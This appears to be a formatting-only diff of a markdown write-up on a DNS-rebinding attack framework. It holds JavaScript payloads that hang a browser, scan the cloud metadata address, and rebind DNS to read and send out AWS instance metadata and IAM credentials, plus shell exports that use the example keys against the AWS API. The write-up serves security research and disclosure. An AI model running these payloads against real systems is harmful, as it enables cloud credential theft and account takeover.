@@ -57,13 +57,13 @@ The ability to cause a browser to hang was added as a configuration key to _dref
 ```javascript
 // fetch an image that will never fully load
 router.get("/hang.png", function (req, res, next) {
-        res
-        .status(200)
-        .set({
-                "Content-Length": "1",
-                })
-        .send();
-        });
+  res
+    .status(200)
+    .set({
+      "Content-Length": "1",
+    })
+    .send();
+});
 ```
 
 With these measures in place, an attacker would have up to four minutes of JavaScript code execution in the browsers.
@@ -84,9 +84,9 @@ const session = new Session();
 const netmap = new NetMap();
 
 function main() {
-    netmap.tcpScan(["169.254.169.254"], [80, 1234, 4444]).then((results) => {
-            session.log(results);
-            });
+  netmap.tcpScan(["169.254.169.254"], [80, 1234, 4444]).then((results) => {
+    session.log(results);
+  });
 }
 
 main();
@@ -129,18 +129,18 @@ import Session from "../libs/session";
 const session = new Session();
 
 async function main() {
-    // configure the A record to point to the AWS metadata endpoint when triggered
-    network.postJSON(session.baseURL + "/arecords", {
-domain: window.env.target + "." + window.env.domain,
-address: "169.254.169.254",
-});
+  // configure the A record to point to the AWS metadata endpoint when triggered
+  network.postJSON(session.baseURL + "/arecords", {
+    domain: window.env.target + "." + window.env.domain,
+    address: "169.254.169.254",
+  });
 
-session.triggerRebind().then(() => {
-        // exfiltrate the response from the provided args.path argument
-        network.get(session.baseURL + window.args.path, (code, headers, body) => {
-                session.log({ code: code, headers: headers, body: body });
-                });
-        });
+  session.triggerRebind().then(() => {
+    // exfiltrate the response from the provided args.path argument
+    network.get(session.baseURL + window.args.path, (code, headers, body) => {
+      session.log({ code: code, headers: headers, body: body });
+    });
+  });
 }
 
 main();
@@ -152,7 +152,7 @@ The security implications from being able to read data from the AWS metadata end
 
 Requesting the `/latest/user-data/` path will return information the developers wish to make accessible to the instances. This is often a bash script that could contain credentials or paths to an S3 bucket, for example:
 
-```json
+````json
 "data": {
     "code": 200,
         "body": "
@@ -178,35 +178,35 @@ Requesting the `/latest/user-data/` path will return information the developers 
                         "code": 200,
                         "body": "eu-north-1-role.kube.nodes.asgspot2"
                     }
-    ```
+````
 
         These credentials can be obtained by requesting `/latest/meta-data/iam/security-credentials/eu-north-1-role.kube.nodes.asgspot2`:
 
-        ```json
-        "data": {
-            "code": 200,
-                "body": "
-                    \"Code\" : \"Success\",
-                \"LastUpdated\" : \"2018-08-05T15:33:26Z\",
-                \"Type\" : \"AWS-HMAC\",
-                \"AccessKeyId\" : \"AKIAI44QH8DHBEXAMPLE\",
-                \"SecretAccessKey\" : \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",
-                \"Token\" : \"AQoDYXdzEJr[....]\",
-                \"Expiration\" : \"2018-08-05T22:00:54Z\"
-                    "
-        }"
-    ```
+```json
+"data": {
+    "code": 200,
+        "body": "
+            \"Code\" : \"Success\",
+        \"LastUpdated\" : \"2018-08-05T15:33:26Z\",
+        \"Type\" : \"AWS-HMAC\",
+        \"AccessKeyId\" : \"AKIAI44QH8DHBEXAMPLE\",
+        \"SecretAccessKey\" : \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",
+        \"Token\" : \"AQoDYXdzEJr[....]\",
+        \"Expiration\" : \"2018-08-05T22:00:54Z\"
+            "
+}"
+```
 
         These can then be used to authenticate to the AWS API:
 
-        ```
-        $ export AWS_ACCESS_KEY_ID=AKIAI44QH8DHBEXAMPLE
-        $ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-        $ export AWS_SESSION_TOKEN=AQoDYXdzEJr[...]
+```
+$ export AWS_ACCESS_KEY_ID=AKIAI44QH8DHBEXAMPLE
+$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+$ export AWS_SESSION_TOKEN=AQoDYXdzEJr[...]
 
-        $ aws ec2 describe-instances
-        [...]
-        ```
+$ aws ec2 describe-instances
+[...]
+```
 
             The extent of the impact is determined by the permissions granted with the credentials. This can range from complete compromise to information disclosure. Even with low privileges, attackers may be able to leverage such access to uncover additional attack paths or escalate their privileges.
 
